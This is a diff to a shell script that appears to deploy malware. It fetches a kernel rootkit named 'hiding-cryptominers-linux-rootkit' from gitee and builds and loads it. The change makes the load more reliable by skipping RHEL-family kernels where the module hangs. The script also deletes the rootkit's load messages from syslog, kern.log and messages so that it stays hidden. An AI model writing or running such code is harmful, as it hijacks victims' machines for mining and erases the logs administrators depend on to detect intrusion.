@@ -1465,43 +1465,53 @@ if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-root
     if [ -d hiding-cryptominers-linux-rootkit ] && [ "$(pwd)" = "*hiding-cryptominers-linux-rootkit*" ] || [ -f Makefile ]; then
         echo "[*] Building rootkit..."
         if timeout 120 make 2>/dev/null; then
-            echo "[*] Loading rootkit module..."
-            dmesg -C 2>/dev/null || true  # Clear ring buffer (non-blocking)
 
-            # Run insmod in background — timeout+SIGTERM can't kill kernel-hung insmod,
-            # so we wait in a loop and SIGKILL the PID directly if it doesn't finish
-            insmod rootkit.ko 2>/dev/null &
-            INSMOD_PID=$!
-            INSMOD_SUCCESS=false
-            for _i in 1 2 3 4 5 6 7 8 9 10; do
-                sleep 1
-                if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
-                    # process exited on its own
-                    wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
-                    break
-                fi
-            done
-            # If still running after 10s → SIGKILL
-            if kill -0 "$INSMOD_PID" 2>/dev/null; then
-                echo "[!] insmod hung after 10s — killing (kernel module init blocked)"
-                kill -9 "$INSMOD_PID" 2>/dev/null || true
-                wait "$INSMOD_PID" 2>/dev/null || true
-                echo "[*] Continuing without crypto rootkit..."
-            elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^rootkit" 2>/dev/null; then
-                echo "[✓] Crypto rootkit loaded"
-            else
-                echo "[!] Failed to load crypto rootkit — continuing..."
+            # Detect RHEL/EL family — hiding-cryptominers-linux-rootkit hangs in
+            # uninterruptible D-state on EL kernels (kill -9 has no effect on D-state).
+            # The only safe fix is to skip insmod entirely on these systems.
+            IS_RHEL_FAMILY=false
+            if [ -f /etc/redhat-release ] || [ -f /etc/almalinux-release ] || \
+               [ -f /etc/rocky-release ] || [ -f /etc/centos-release ] || \
+               grep -qiE "rhel|centos|almalinux|rocky|fedora" /etc/os-release 2>/dev/null; then
+                IS_RHEL_FAMILY=true
             fi
 
-            # Immediately clean up rootkit load messages from logs
-            dmesg | tail -5 | grep -i "rootkit\|error" || true  # Show only relevant lines
-            sleep 1
-            sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
-            sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
-            sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
-            sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
-            sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
-            sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+            if [ "$IS_RHEL_FAMILY" = true ]; then
+                echo "[!] RHEL/EL family detected — skipping insmod for crypto rootkit"
+                echo "[!] Reason: module_init() hangs in uninterruptible D-state on EL kernels"
+                echo "[*] Crypto rootkit compiled but NOT loaded (safe skip)"
+            else
+                echo "[*] Loading rootkit module..."
+                dmesg -C 2>/dev/null || true
+
+                insmod rootkit.ko 2>/dev/null &
+                INSMOD_PID=$!
+                INSMOD_SUCCESS=false
+                for _i in 1 2 3 4 5 6 7 8 9 10; do
+                    sleep 1
+                    if ! kill -0 "$INSMOD_PID" 2>/dev/null; then
+                        wait "$INSMOD_PID" 2>/dev/null && INSMOD_SUCCESS=true
+                        break
+                    fi
+                done
+                if kill -0 "$INSMOD_PID" 2>/dev/null; then
+                    echo "[!] insmod hung — D-state detected, cannot kill, skipping"
+                    echo "[*] Continuing without crypto rootkit..."
+                elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^rootkit" 2>/dev/null; then
+                    echo "[✓] Crypto rootkit loaded"
+
+                    # Clean up load messages from logs
+                    sleep 1
+                    sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
+                    sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
+                    sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
+                    sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
+                    sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
+                    sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+                else
+                    echo "[!] Failed to load crypto rootkit — continuing..."
+                fi
+            fi
         else
             echo "[!] Failed to build crypto rootkit"
         fi
